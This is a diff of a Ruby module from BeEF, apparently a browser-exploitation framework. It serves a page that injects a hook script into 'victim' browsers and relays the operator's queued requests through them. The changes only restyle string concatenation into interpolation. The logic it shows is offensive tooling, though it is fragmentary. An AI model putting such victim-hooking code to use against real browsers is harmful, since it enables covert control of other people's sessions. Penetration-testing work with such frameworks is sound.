@@ -17,7 +17,7 @@ module BeEF
               victim_ip = socket.peeraddr[2].to_s
 
               log "-------------------------------\n"
-              log '[Server] Incoming request from ' + victim_ip + "(Victim)\n"
+              log "[Server] Incoming request from #{victim_ip}(Victim)\n"
 
               response = File.read(File.expand_path('views/index.html', __dir__))
               configuration = BeEF::Core::Configuration.instance
@@ -29,10 +29,7 @@ module BeEF
               response.sub!('path_to_hookjs_template', hook_uri)
 
               start_string = socket.gets
-              socket.print "HTTP/1.1 200 OK\r\n" +
-                           "Content-Type: text/html\r\n" +
-                           "Content-Length: #{response.bytesize}\r\n" +
-                           "Connection: close\r\n"
+              socket.print "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: #{response.bytesize}\r\nConnection: close\r\n"
               socket.print "\r\n"
               socket.print response
               socket.close
@@ -81,7 +78,7 @@ module BeEF
           end
 
           headers.to_a.each do |header, value|
-            socket.print header + ': ' + value + "\r\n"
+            socket.print "#{header}: #{value}\r\n"
           end
 
           socket.print "\r\n"
@@ -115,7 +112,7 @@ module BeEF
 
         def self.handle_victim(socket, http_message)
           log "[Victim]request from victim\n"
-          log http_message['start_string'].to_s + "\n"
+          log "#{http_message['start_string'].to_s}\n"
 
           if http_message['start_string'].include?('POST')
             # Get result from POST query
@@ -123,12 +120,12 @@ module BeEF
 
             # Read query on which asked victim
             query = http_message['start_string'][/path=([^HTP]+)/, 1][0..-2]
-            log '[Victim]asked path: ' + query + "\n"
+            log "[Victim]asked path: #{query}\n"
 
             length = http_message['headers']['Content-Length'].to_i
             content_type = http_message['headers']['Content-Type']
-            log '[Victim]Content-type: ' + content_type.to_s + "\n"
-            log '[Vicitm]Length: ' + length.to_s + "\n"
+            log "[Victim]Content-type: #{content_type.to_s}\n"
+            log "[Vicitm]Length: #{length.to_s}\n"
 
             response = http_message['response']
             log "[Victim]Get content!\n"
@@ -157,7 +154,7 @@ module BeEF
             @mutex_queries.lock
             log "[Victim]Get the last query\n"
             last_query = @queries.pop
-            log '[Victim]Last query:' + last_query.to_s + "\n"
+            log "[Victim]Last query:#{last_query.to_s}\n"
             @mutex_queries.unlock
 
             response = last_query[2]
@@ -175,7 +172,7 @@ module BeEF
 
           if http_message['start_string'].include?('GET')
             unless path.nil?
-              log '[Owner]Need path: ' + path + "\n"
+              log "[Owner]Need path: #{path}\n"
               @queries.push(['GET', path, ''])
             end
           elsif http_message['start_string'].include?('POST')
